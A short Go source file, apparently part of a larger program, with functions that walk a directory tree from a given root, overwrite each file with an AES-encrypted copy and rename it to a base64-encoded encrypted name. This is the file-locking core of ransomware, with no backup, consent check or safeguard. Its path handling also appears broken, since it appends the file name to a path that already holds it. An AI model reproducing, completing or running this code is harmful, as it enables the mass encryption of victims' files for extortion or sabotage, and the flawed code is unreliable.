package main

import (
	b64 "encoding/base64"
	"io/ioutil"
	"os"
	"path/filepath"
)

func GetFileContent(fileName string) []byte {
	data, err := ioutil.ReadFile(fileName)
	checkError(err)
	return data
}

func WriteToFile(fileName string, data []byte) {
	err := ioutil.WriteFile(fileName, data, 0644)
	checkError(err)
}

func EncryptFile(fileName string, key []byte) {
	plainText := GetFileContent(fileName)
	encryptedData := EncryptDataAES(key, plainText)
	WriteToFile(fileName, encryptedData)
}

func EncryptFileName(fileName string, key []byte) string {
	fileNameBytes := []byte(fileName)
	encryptedFileName := EncryptDataAES(key, fileNameBytes)
	newFileName := b64.StdEncoding.EncodeToString(encryptedFileName)
	return newFileName
}

func EncryptSystem(root string, key []byte) {
	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if !d.IsDir() {
			originaPath := path + d.Name()
			newFileName := EncryptFileName(d.Name(), key)
			newPath := path + newFileName
			EncryptFile(originaPath, key)
			err := os.Rename(originaPath, newPath)
			checkError(err)
		}
		return nil
	})
	checkError(err)
}
